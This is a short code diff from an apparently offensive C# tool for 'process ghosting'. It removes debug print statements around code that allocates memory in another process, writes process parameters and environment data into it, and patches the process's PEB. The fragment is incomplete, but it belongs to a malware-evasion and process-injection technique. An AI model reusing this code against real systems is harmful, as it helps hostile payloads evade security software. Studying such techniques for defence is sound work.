@@ -175,7 +175,6 @@ namespace ProcessGhosting
             }
             else
             {
-                Console.WriteLine("Here!!!!!!!!!!!!!");
                 return pMemLoc;
             }
 
@@ -278,20 +277,14 @@ namespace ProcessGhosting
             VirtualAllocEx(hProcess, pProcParams, (uint)Length, (int)(AllocationType.Commit | AllocationType.Reserve), (int)MemoryProtection.ReadWrite);
             Console.WriteLine("Check Error : " + GetLastError());
             writememstat = WriteRemoteMem(hProcess, pProcParams, pProcParams, Length, MemoryProtection.ReadWrite);
-            Console.WriteLine("Write Mem stat : " + writememstat);
-            SetLastError(0);
             
-            SetLastError(0);
-            //uint byteswritten = 0;
             VirtualAllocEx(hProcess, EnvPtr, (uint)EnvSize, (int)(AllocationType.Commit | AllocationType.Reserve), (int)MemoryProtection.ReadWrite);
             Console.WriteLine("Check error 2 : " + GetLastError());
             writememstat = WriteRemoteMem(hProcess, EnvPtr, EnvPtr, EnvSize, MemoryProtection.ReadWrite);
-            Console.WriteLine("Write mem stat 2 : " + writememstat);
 
             //Set params in peb
             IntPtr myProcParams = Marshal.AllocHGlobal(ReadSize);
             Marshal.WriteInt64(myProcParams, (Int64)pProcParams);
-            Console.WriteLine("Writing Process Parameters to peb : 0x{0:X}", temp.ToInt64());
 
             writememstat = WriteRemoteMem(hProcess, myProcParams, (IntPtr)(temp.ToInt64() + 0x20), ReadSize, MemoryProtection.ReadWrite);
 
